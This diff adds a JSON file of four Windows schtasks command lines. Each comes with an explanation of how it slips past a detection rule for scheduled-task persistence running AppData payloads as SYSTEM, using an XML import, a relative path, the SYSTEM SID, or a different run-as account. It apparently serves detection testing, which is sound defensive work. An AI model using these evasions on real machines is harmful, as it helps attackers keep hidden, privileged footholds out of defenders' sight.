@@ -1,0 +1,18 @@
+[
+  {
+    "output": "schtasks.exe /Create /SC ONLOGON /RU Administrator /TR \"C:\\Users\\Public\\AppData\\Local\\malware.exe\"",
+    "explanation": "The command creates a scheduled task that runs a payload from C:\\Users\\<USER>\\AppData\\Local\\, satisfying the rule's path-based selection. However, it uses /RU Administrator instead of a value containing 'NT AUTHORITY\\SYSTEM' or ' SYSTEM ', so the CommandLine|contains condition for 'NT AUT' or ' SYSTEM ' is not met, causing the rule's selection to fail and the event to be excluded from detection."
+  },
+  {
+    "output": "schtasks /create /tn \"UpdateTask\" /xml C:\\Windows\\Temp\\task_config.xml",
+    "explanation": "Bypasses the rule by importing the scheduled task configuration directly from an XML file. The command line logged for schtasks.exe will only contain the /xml flag and the path to the XML, completely omitting the /TR, /RU flags, and the AppData path expected by the detection rule."
+  },
+  {
+    "output": "cmd.exe /c \"cd C:\\Users\\Public\\..\\Admin\\AppData\\Local && schtasks /Create /TN \"UpdateTask\" /TR \"payload.exe\" /SC ONSTART /RU SYSTEM\"",
+    "explanation": "Bypasses the rule by changing the current working directory prior to executing schtasks, allowing the use of a relative path ('payload.exe') in the /TR parameter. This prevents the strings 'C:\\Users\\' and '\\AppData\\Local\\' from appearing in the schtasks command line."
+  },
+  {
+    "output": "schtasks /Create /TN \"UpdateTask\" /TR \"C:\\Users\\Admin\\AppData\\Local\\payload.exe\" /SC ONSTART /RU S-1-5-18",
+    "explanation": "Bypasses the rule by using the well-known Security Identifier (SID) for the SYSTEM account (S-1-5-18) instead of its string representation. The rule explicitly looks for 'NT AUT' or ' SYSTEM ', which are both evaded by using the SID."
+  }
+]
